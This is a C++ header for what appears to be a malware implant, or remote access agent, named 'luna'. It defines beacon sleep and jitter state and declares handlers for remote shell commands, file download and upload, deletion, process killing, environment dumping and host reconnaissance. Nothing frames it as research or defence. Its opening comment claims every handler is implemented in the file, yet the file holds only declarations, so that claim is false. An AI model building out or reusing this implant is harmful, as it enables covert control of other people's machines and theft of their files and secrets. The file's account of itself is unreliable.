// Implant command handlers. Every entry in the dispatch table is implemented
// here; there are no placeholders.
#pragma once

#include "json.hpp"

#include <string>

namespace luna {

struct Result {
    bool ok = false;
    std::string data;
    std::string err;
};

struct AgentState {
    std::string cwd;
    int sleep_seconds = 60;
    int jitter_percent = 20;
    bool shutdown_requested = false;
};

Result handle_shell(const Json& args, AgentState& state);
Result handle_pwd(const Json& args, AgentState& state);
Result handle_cd(const Json& args, AgentState& state);
Result handle_ls(const Json& args, AgentState& state);
Result handle_cat(const Json& args, AgentState& state);
Result handle_download(const Json& args, AgentState& state);
Result handle_upload(const Json& args, AgentState& state);
Result handle_rm(const Json& args, AgentState& state);
Result handle_mkdir(const Json& args, AgentState& state);
Result handle_ps(const Json& args, AgentState& state);
Result handle_kill(const Json& args, AgentState& state);
Result handle_env(const Json& args, AgentState& state);
Result handle_sysinfo(const Json& args, AgentState& state);
Result handle_sleep(const Json& args, AgentState& state);
Result handle_exit(const Json& args, AgentState& state);
Result handle_whoami(const Json& args, AgentState& state);

}  // namespace luna
